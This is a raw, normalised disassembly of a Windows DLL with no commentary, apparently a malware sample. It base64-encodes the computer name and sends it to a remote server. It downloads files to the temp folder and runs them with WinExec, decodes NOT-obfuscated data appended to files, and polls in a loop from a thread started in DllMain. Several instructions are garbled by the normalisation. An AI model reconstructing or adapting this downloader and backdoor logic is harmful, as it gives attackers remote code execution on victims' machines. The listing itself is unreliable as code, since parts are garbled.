sub_10001000
push ecx
push ebx
push esi
mov esi [ esp + 0x14 ]
mov ecx 0x3
mov eax esi
xor ebx ebx
cdq
idiv ecx
cmp edx ebx
jne r-xdata
cmp edx 0x1
jne r-xdata
mov eax esi
jmp r-xdata
cmp edx 0x2
lea eax [ esi + 0x1 ]
je r-xdata
lea eax [ esi + 0x2 ]
jmp r-xdata
lea ecx [ eax * 4 ]
mov eax 0x55555556
imul ecx
mov ecx [ esp + 0x1c ]
mov eax edx
shr eax 0x1f
add edx eax
dec ecx
cmp ecx edx
jge r-xdata
mov eax [ esp + 0x8 ]
push ebp
lea edx [ esi + 0x1 ]
push edi
push edx
mov [ esp + 0x14 ] esi
mov [ esp + 0x28 ] ebx
call ??2@YAPAXI@Z
mov ecx esi
mov esi [ esp + 0x1c ]
mov ebp eax
mov eax ecx
mov edi ebp
add esp 0x4
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
cmp ecx 0x3
mov [ ecx + ebp ] 0x0
jl r-xdata
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esp + 0x10 ]
cmp eax 0x2
jne r-xdata
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea eax [ edx + edx * 2 ]
sub ecx eax
mov [ esp + 0x10 ] ecx
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x24 ]
mov cl [ eax + ebp ]
lea edi [ eax + ebp + 0x1 ]
sar ecx 0x2
and ecx 0x3f
mov dl [ ecx + rw-data ]
mov [ ebx + esi ] dl
mov al [ eax + ebp ]
mov cl [ edi ]
and eax 0x3
sar ecx 0x4
shl eax 0x4
and ecx 0xf
or eax ecx
mov dl [ eax + rw-data ]
mov [ ebx + esi + 0x1 ] dl
mov al [ edi ]
and eax 0xf
mov cl [ eax * 4 + rw-data ]
mov [ ebx + esi + 0x2 ] cl
mov [ ebx + esi + 0x3 ] 0x3d
jmp r-xdata
mov edi [ esp + 0x24 ]
add ebx 0x4
mov cl [ edi + ebp ]
add edi 0x3
sar ecx 0x2
and ecx 0x3f
mov [ esp + 0x24 ] edi
mov al [ ecx + rw-data ]
mov [ esi + ebx - 0x4 ] al
mov cl [ edi + ebp - 0x3 ]
mov al [ edi + ebp - 0x2 ]
and ecx 0x3
sar eax 0x4
shl ecx 0x4
and eax 0xf
or ecx eax
mov cl [ ecx + rw-data ]
mov [ esi + ebx - 0x3 ] cl
mov al [ edi + ebp - 0x1 ]
mov cl [ edi + ebp - 0x2 ]
sar eax 0x6
and ecx 0xf
and eax 0x3
shl ecx 0x2
or eax ecx
mov al [ eax + rw-data ]
mov [ esi + ebx - 0x2 ] al
mov cl [ edi + ebp - 0x1 ]
and ecx 0x3f
dec edx
mov al [ ecx + rw-data ]
mov [ esi + ebx - 0x1 ] al
jne r-xdata
push ebp
mov [ ebx + esi ] 0x0
call ??3@YAXPAX@Z
add esp 0x4
mov eax ebx
pop edi
pop ebp
pop esi
pop ebx
pop ecx
retn
mov eax [ esp + 0x24 ]
mov dl [ eax + ebp ]
sar edx 0x2
and edx 0x3f
mov cl [ edx + rw-data ]
mov [ ebx + esi ] cl
mov dl [ eax + ebp ]
and edx 0x3
shl edx 0x4
mov al [ edx + rw-data ]
mov [ ebx + esi + 0x1 ] al
mov al 0x3d
mov [ ebx + esi + 0x2 ] al
mov [ ebx + esi + 0x3 ] al
add ebx 0x4
sub_100011d0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
mov eax edi
and eax 0x80000003
jns r-xdata
je r-xdata
dec eax
or eax 0xfffffffc
inc eax
push rw-data
push esi
xor ebx ebx
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
push 0x3d
push esi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov ebx 0x2
jmp r-xdata
lea eax [ edi + edi * 2 ]
cdq
and edx 0x3
add eax edx
mov ecx eax
mov eax [ esp + 0x18 ]
sar ecx 0x2
sub ecx ebx
cmp eax ecx
jge r-xdata
mov ebx 0x1
sub edi ebx
push ebp
mov [ esp + 0x14 ] edi
push eax
xor edi edi
xor ebx ebx
call ??2@YAPAXI@Z
mov ebp eax
mov eax [ esp + 0x18 ]
add esp 0x4
cmp eax 0x4
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp eax 0x3
jne r-xdata
mov ecx eax
shr ecx 0x2
mov [ esp + 0x1c ] ecx
neg ecx
lea edx [ eax + ecx * 4 ]
mov [ esp + 0x14 ] edx
cmp eax 0x2
jne r-xdata
movsx eax [ edi + esi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ edi + esi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov dl [ ebx + ebp ]
sub eax rw-data
mov ecx eax
sar ecx 0x4
or dl cl
shl al 0x4
mov [ ebx + ebp ] dl
mov [ ebx + ebp + 0x1 ] al
movsx edx [ edi + esi + 0x2 ]
push edx
push rw-data
call [ strchr@IAT ]
mov cl [ ebx + ebp + 0x1 ]
sub eax rw-data
sar eax 0x2
or cl al
add esp 0x18
mov [ ebx + ebp + 0x1 ] cl
add ebx 0x2
jmp r-xdata
movsx eax [ esi + edi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ esi + edi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov dl [ ebx + ebp ]
sub eax rw-data
mov ecx eax
sar ecx 0x4
or dl cl
shl al 0x4
mov [ ebx + ebp ] dl
mov [ ebx + ebp + 0x1 ] al
movsx edx [ esi + edi + 0x2 ]
push edx
push rw-data
call [ strchr@IAT ]
mov dl [ ebx + ebp + 0x1 ]
sub eax rw-data
mov ecx eax
sar ecx 0x2
or dl cl
shl al 0x6
mov [ ebx + ebp + 0x1 ] dl
mov [ ebx + ebp + 0x2 ] al
movsx edx [ esi + edi + 0x3 ]
push edx
push rw-data
call [ strchr@IAT ]
mov cl [ ebx + ebp + 0x2 ]
sub eax rw-data
or cl al
mov eax [ esp + 0x3c ]
mov [ ebx + ebp + 0x2 ] cl
add esp 0x20
add edi 0x4
add ebx 0x3
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
mov ecx ebx
mov eax ecx
mov esi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebp
and ecx 0x3
[ edi ] [ esi ]
call ??3@YAXPAX@Z
add esp 0x4
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
movsx eax [ edi + esi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ edi + esi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov cl [ ebx + ebp ]
sub eax rw-data
sar eax 0x4
or cl al
add esp 0x10
mov [ ebx + ebp ] cl
inc ebx
sub_10001410
sub esp 0x104
mov al [ rw-data ]
push ebx
push ebp
push edi
mov [ esp + 0xc ] al
mov ecx 0x40
xor eax eax
lea edi [ esp + 0xd ]
[ edi ]
mov ebx [ esp + 0x114 ]
push 0x2f
stosw [ edi ]
stosb [ edi ]
mov edi [ strrchr@IAT ]
push ebx
call edi
add esp 0x8
test eax eax
jne r-xdata
mov ebp [ esp + 0x11c ]
push esi
test ebp ebp
je r-xdata
pop edi
pop ebp
mov eax 0x1
pop ebx
add esp 0x104
retn
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x11c ]
push 0x2e
push esi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop ebp
pop ebx
add esp 0x104
retn
test ebp ebp
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
push 0x2e
push esi
call edi
add esp 0x8
sub eax esi
jmp r-xdata
xor eax eax
lea edx [ esp + 0xc ]
push eax
push edx
call [ WinExec@IAT ]
cmp eax 0x1f
ja r-xdata
mov al 0x65
mov [ esp + ecx + 0x10 ] 0x2e
mov [ esp + ecx + 0x11 ] al
mov [ esp + ecx + 0x12 ] 0x78
mov [ esp + ecx + 0x13 ] al
mov [ esp + ecx + 0x14 ] 0x0
jmp r-xdata
mov ecx eax
lea edi [ esp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx eax
xor ecx ecx
test eax eax
jle r-xdata
pop edi
pop ebp
mov eax 0x7
pop ebx
add esp 0x104
retn
lea ecx [ esp + 0x10 ]
push ecx
push ebx
call sub_10001540
add esp 0x8
test eax eax
pop esi
jne r-xdata
sub_10001540
sub esp 0x610
push ebx
push ebp
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x11c ]
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
push 0x0
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push 0x0
and ecx 0x3
push 0x0
[ edi ] [ esi ]
lea ecx [ esp + 0x12c ]
push ecx
call [ InternetOpenA@IAT ]
mov ebp eax
test ebp ebp
mov [ esp + 0x10 ] ebp
jne r-xdata
mov esi [ esp + 0x624 ]
push 0x0
push 0x84000100
push 0x0
push 0x0
push esi
push ebp
call [ InternetOpenUrlA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov ebx [ esp + 0x14 ]
mov esi 0x2
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
push 0x104
call [ GetTempPathA@IAT ]
push 0x2f
push esi
call [ strrchr@IAT ]
mov edi eax
or ecx 0xffffffff
inc edi
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x20 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x20 ]
and ecx 0x3
push rw-data
[ edi ] [ esi ]
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
mov esi 0x3
jmp r-xdata
test ebx ebx
je r-xdata
mov edi [ fwrite@IAT ]
mov ebp [ fflush@IAT ]
mov esi 0x4
jmp r-xdata
test ebp ebp
je r-xdata
push ebx
call [ InternetCloseHandle@IAT ]
mov esi 0x5
jmp r-xdata
mov eax [ esp + 0x14 ]
push esi
test eax eax
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
call [ DeleteFileA@IAT ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x610
retn
push ebp
call [ InternetCloseHandle@IAT ]
mov ebp [ esp + 0x10 ]
call [ fclose@IAT ]
mov esi [ InternetCloseHandle@IAT ]
add esp 0x4
push ebx
call esi
mov ecx [ esp + 0x10 ]
push ecx
call esi
mov edx [ esp + 0x628 ]
lea eax [ esp + 0x18 ]
push edx
push eax
call sub_100016f0
mov esi eax
add esp 0x8
neg esi
sbb esi esi
and esi 0xfffffffa
add esi 0x6
push eax
lea eax [ esp + 0x228 ]
push 0x1
push eax
call edi
push esi
call ebp
add esp 0x14
jmp r-xdata
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x220 ]
push ecx
push 0x400
push edx
push ebx
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
sub_100016f0
sub esp 0x40c
mov eax [ esp + 0x410 ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
mov [ esp + 0x18 ] 0xff
mov [ esp + 0x19 ] 0x3
mov [ esp + 0x1a ] 0xb7
mov [ esp + 0x1b ] 0xb9
call [ fopen@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov ebx [ fseek@IAT ]
push 0x2
push 0xfffffffa
push edi
call ebx
push edi
push 0x4
lea ecx [ esp + 0x28 ]
push 0x1
push ecx
call [ fread@IAT ]
mov esi [ esp + 0x30 ]
mov edx [ esp + 0x31 ]
mov eax [ esp + 0x32 ]
and esi 0xff
mov ecx [ esp + 0x33 ]
and edx 0xff
shl esi 0x8
add esi edx
and eax 0xff
shl esi 0x8
add esi eax
push 0x2
shl esi 0x8
and ecx 0xff
push 0x0
push edi
add esi ecx
call ebx
push edi
call [ ftell@IAT ]
mov edx 0xfffffff6
push 0x0
mov ebp eax
sub edx esi
push esi
push edi
add ebp edx
call ebx
push edi
push 0x4
lea eax [ esp + 0x5c ]
push 0x1
push eax
call [ fread@IAT ]
lea edx [ esp + 0x64 ]
lea ecx [ esp + 0x58 ]
add esp 0x48
mov eax [ edx ]
mov edx [ ecx ]
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40c
retn
mov ecx [ esp + 0x424 ]
push rw-data
push ecx
xor ebx ebx
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push edi
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40c
retn
push edi
push 0x400
lea edx [ esp + 0x24 ]
push 0x1
push edx
call [ fread@IAT ]
add ebx eax
add esp 0x10
cmp ebx ebp
jg r-xdata
push edi
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40c
retn
sub eax ebx
xor ecx ecx
add eax ebp
test eax eax
jle r-xdata
xor ecx ecx
test eax eax
jle r-xdata
push esi
push eax
lea eax [ esp + 0x24 ]
push 0x1
push eax
call [ fwrite@IAT ]
push esi
call [ fflush@IAT ]
push esi
mov esi [ fclose@IAT ]
call esi
push edi
call esi
add esp 0x1c
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40c
retn
mov dl [ esp + ecx + 0x1c ]
inc ecx
not dl
mov [ esp + ecx + 0x1b ] dl
cmp ecx eax
jl r-xdata
push esi
push eax
lea eax [ esp + 0x24 ]
push 0x1
push eax
call [ fwrite@IAT ]
push esi
call [ fflush@IAT ]
add esp 0x14
jmp r-xdata
mov dl [ esp + ecx + 0x1c ]
inc ecx
not dl
mov [ esp + ecx + 0x1b ] dl
cmp ecx eax
jl r-xdata
sub_100018b0
mov ecx [ esp + 0x4 ]
sub esp 0x298
lea eax [ esp ]
push ebp
push esi
push edi
push 0x104
push eax
push ecx
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0xc ]
push edx
call [ LoadLibraryA@IAT ]
mov ebp [ LoadStringA@IAT ]
push 0x191
mov esi eax
push rw-data
push 0x1
push esi
call ebp
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x12d
[ edi ]
not ecx
dec ecx
push rw-data
push ecx
push rw-data
call sub_10001b20
add esp 0x10
mov [ eax + rw-data ] 0x0
lea eax [ esp + 0x110 ]
push 0x191
push eax
push 0x2
push esi
call ebp
lea edi [ esp + 0x110 ]
or ecx 0xffffffff
xor eax eax
push 0x12d
[ edi ]
not ecx
dec ecx
push rw-data
push ecx
lea ecx [ esp + 0x11c ]
push ecx
call sub_10001b20
add esp 0x10
mov [ eax + rw-data ] 0x0
push esi
call [ FreeLibrary@IAT ]
pop edi
pop esi
mov eax [ esp + 0x2a4 ]
pop ebp
dec eax
jne r-xdata
mov eax 0x1
add esp 0x298
retn 0xc
push 0x0
push 0x0
push 0x0
push sub_100019a0
push 0x0
push 0x0
call [ CreateThread@IAT ]
sub_100019a0
sub esp 0x10c
push ebx
push ebp
push esi
push edi
push 0x105
call [ malloc@IAT ]
add esp 0x4
xor esi esi
mov ebp eax
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] esi
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] esi
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea ebx [ ebp + 0x1 ]
push 0x2f
push ebx
call [ strrchr@IAT ]
mov edi eax
or ecx 0xffffffff
inc edi
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x20 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x20 ]
and ecx 0x3
push 0x1
push eax
push ebx
[ edi ] [ esi ]
call sub_10001410
add esp 0x14
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
push 0x75300
mov [ esp + 0x14 ] 0x0
call [ Sleep@IAT ]
xor esi esi
jmp r-xdata
mov ecx [ esp + 0x10 ]
inc ecx
cmp ecx 0x3
mov [ esp + 0x10 ] ecx
jl r-xdata
lea ecx [ ebp + 0x1 ]
mov [ esp + 0x14 ] esi
push ecx
mov [ esp + 0x14 ] esi
call [ atoi@IAT ]
lea eax [ eax + eax * 2 ]
add esp 0x4
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x5
push edx
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov [ esp + 0x10 ] esi
inc ecx
cmp ecx 0x3
mov [ esp + 0x14 ] ecx
jl r-xdata
mov ecx 0x41
xor eax eax
mov edi ebp
push rw-data
[ edi ]
push ebp
push rw-data
stosb [ edi ]
call sub_10001c00
add esp 0xc
cmp eax 0xfffffffe
je r-xdata
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 4 ]
shl ecx 0x5
push ecx
call [ Sleep@IAT ]
xor esi esi
jmp r-xdata
push 0x5b8d80
call [ Sleep@IAT ]
xor esi esi
jmp r-xdata
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
push eax
call [ Sleep@IAT ]
jmp r-xdata
push 0x5265c0
call [ Sleep@IAT ]
jmp r-xdata
sub_10001b20
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
lea ebx [ eax + 0x1 ]
push ebx
call [ malloc@IAT ]
mov ecx ebx
mov esi eax
mov edx ecx
xor eax eax
mov edi esi
push ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
mov eax [ esp + 0x1c ]
push eax
call sub_10002170
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov ebx [ esp + 0x18 ]
push ecx
push ebx
push esi
call sub_100011d0
mov edi eax
push esi
mov [ edi + ebx ] 0x0
call [ free@IAT ]
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
pop ebx
retn
sub_10001b90
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
lea ebx [ ebp + 0x1 ]
push ebx
call [ malloc@IAT ]
mov ecx ebx
mov esi eax
mov edx ecx
xor eax eax
mov edi esi
push ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
push eax
push ecx
call sub_10001000
add esp 0x14
test eax eax
jne r-xdata
mov ebx [ esp + 0x1c ]
push ebp
push ebx
push esi
call sub_10002090
mov edi eax
push esi
mov [ edi + ebx ] 0x0
call [ free@IAT ]
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10001c00
sub esp 0x798
push ebx
push ebp
push esi
lea eax [ esp + 0x18 ]
push edi
lea ecx [ esp + 0x24 ]
xor ebx ebx
push eax
push ecx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x24 ] 0x1f
mov [ esp + 0x20 ] ebx
call [ GetComputerNameA@IAT ]
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x44 ]
[ edi ]
not ecx
push 0x29
dec ecx
push edx
lea eax [ esp + 0x2c ]
push ecx
push eax
call sub_10001b90
or ecx 0xffffffff
mov edi rw-data
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x70 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x70 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x44 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x70 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x70 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x7b4 ]
or ecx 0xffffffff
push ebx
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x78 ]
and ecx 0x3
push ebx
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x80 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ InternetOpenA@IAT ]
cmp eax ebx
mov [ esp + 0x20 ] eax
jne r-xdata
mov esi [ esp + 0x7ac ]
push ebx
push 0x84000100
push ebx
push ebx
push esi
push eax
call [ InternetOpenUrlA@IAT ]
cmp eax ebx
mov [ esp + 0x14 ] eax
jne r-xdata
mov esi 0x2
jmp r-xdata
lea ecx [ esp + 0x174 ]
push ecx
push 0x104
call [ GetTempPathA@IAT ]
push 0x2f
push esi
call [ strrchr@IAT ]
mov edi eax
or ecx 0xffffffff
inc edi
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x17c ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x17c ]
and ecx 0x3
push rw-data
[ edi ] [ esi ]
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x10
cmp esi ebx
jne r-xdata
mov [ esp + 0x10 ] 0x3
jmp r-xdata
lea eax [ esp + 0x174 ]
push eax
call [ DeleteFileA@IAT ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x798
retn
mov ebx [ InternetReadFile@IAT ]
mov ebp [ fwrite@IAT ]
mov [ esp + 0x10 ] 0x4
jmp r-xdata
mov eax [ esp + 0x14 ]
mov esi [ InternetCloseHandle@IAT ]
test eax eax
je r-xdata
mov ebx [ fclose@IAT ]
push esi
call ebx
add esp 0x4
test edi edi
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
push edx
call esi
mov esi [ esp + 0x10 ]
push eax
call esi
push esi
call ebx
lea edx [ esp + 0x27c ]
push 0x12d
lea eax [ esp + 0x17c ]
push edx
push eax
call sub_10001f10
add esp 0x10
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0x5
jmp r-xdata
push esi
push eax
lea ecx [ esp + 0x3b0 ]
push 0x1
push ecx
call ebp
push esi
call [ fflush@IAT ]
add esp 0x14
jmp r-xdata
mov edx [ esp + 0x7b0 ]
mov cl [ esp + 0x278 ]
lea esi [ esp + 0x279 ]
mov [ edx ] cl
lea ecx [ eax - 0x1 ]
mov ebx ecx
lea edi [ edx + 0x1 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov [ eax + edx ] 0x0
mov dl [ edx ]
cmp dl 0x65
jne r-xdata
mov [ esp + 0x10 ] 0x6
jmp r-xdata
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x3ac ]
push 0x400
push edx
push eax
call ebx
mov edi eax
test edi edi
je r-xdata
cmp dl 0x66
jne r-xdata
mov [ esp + 0x10 ] 0xffffffff
jmp r-xdata
mov [ esp + 0x10 ] 0xfffffffe
sub_10001f10
sub esp 0x1a0
mov eax [ esp + 0x1a4 ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
mov [ esp + 0x18 ] 0xff
mov [ esp + 0x19 ] 0x2
mov [ esp + 0x1a ] 0xb7
mov [ esp + 0x1b ] 0xbc
call [ fopen@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
mov edi [ fseek@IAT ]
push 0x2
push 0xfffffffa
push ebx
call edi
push ebx
push 0x4
lea ecx [ esp + 0x28 ]
push 0x1
push ecx
call [ fread@IAT ]
mov esi [ esp + 0x30 ]
mov edx [ esp + 0x31 ]
mov eax [ esp + 0x32 ]
and esi 0xff
mov ecx [ esp + 0x33 ]
and edx 0xff
shl esi 0x8
add esi edx
and eax 0xff
shl esi 0x8
add esi eax
push 0x2
shl esi 0x8
and ecx 0xff
push 0x0
push ebx
add esi ecx
call edi
push ebx
call [ ftell@IAT ]
mov edx 0xfffffff6
push 0x0
mov ebp eax
sub edx esi
push esi
push ebx
add ebp edx
call edi
push ebx
push 0x4
lea eax [ esp + 0x5c ]
push 0x1
push eax
call [ fread@IAT ]
lea edx [ esp + 0x64 ]
lea ecx [ esp + 0x58 ]
add esp 0x48
mov eax [ edx ]
mov edx [ ecx ]
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn
mov ecx 0x64
xor eax eax
lea edi [ esp + 0x1c ]
cmp ebp 0x190
[ edi ]
stosb [ edi ]
push ebx
jbe r-xdata
push ebx
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn
push ebp
lea ecx [ esp + 0x24 ]
push 0x1
push ecx
call [ fread@IAT ]
push ebx
call [ fclose@IAT ]
add esp 0x14
xor eax eax
test ebp ebp
jle r-xdata
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn
mov eax [ esp + 0x1bc ]
mov esi [ esp + 0x1b8 ]
push eax
push esi
lea ecx [ esp + 0x24 ]
push ebp
push ecx
call sub_10001b20
add esp 0x10
mov [ eax + esi ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn
mov dl [ esp + eax + 0x1c ]
inc eax
not dl
mov [ esp + eax + 0x1b ] dl
cmp eax ebp
jl r-xdata
sub_10002090
mov edx [ esp + 0x4 ]
sub esp 0x8
or ecx 0xffffffff
xor eax eax
push edi
mov edi edx
[ edi ]
mov eax [ esp + 0x18 ]
not ecx
dec ecx
dec eax
cmp eax ecx
jge r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov [ esp + 0x4 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov [ esp + 0x18 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
xor edi edi
test ecx ecx
mov [ esp + 0x8 ] ecx
jle r-xdata
xor eax eax
pop edi
add esp 0x8
retn
mov edx [ esp + 0x14 ]
mov eax edi
mov [ edi + edx ] 0x0
pop edi
add esp 0x8
retn
mov ecx [ esp + 0x14 ]
mov eax edx
push ebx
sub eax ecx
push ebp
mov ebp [ strchr@IAT ]
push esi
mov [ esp + 0x1c ] eax
jmp r-xdata
mov ecx [ esp + 0x20 ]
lea ebx [ edi + ecx ]
movsx edx [ eax + ebx ]
push edx
push rw-data
call ebp
mov esi eax
mov eax edi
cdq
idiv [ esp + 0x2c ]
sub esi rw-data
movsx eax [ edx + rw-data ]
push eax
push rw-data
call ebp
sub esi rw-data
add esp 0x10
add eax esi
cdq
idiv [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
inc edi
cmp edi eax
mov cl [ edx + rw-data ]
mov [ ebx ] cl
jl r-xdata
mov eax [ esp + 0x1c ]
pop esi
pop ebp
pop ebx
sub_10002170
push ecx
mov edx [ esp + 0x8 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x14 ]
not ecx
dec ecx
dec eax
cmp eax ecx
jge r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov [ esp + 0x18 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
push esi
dec ecx
xor esi esi
mov [ esp + 0xc ] ecx
test ecx ecx
jle r-xdata
xor eax eax
pop edi
pop ecx
retn
mov eax [ esp + 0x18 ]
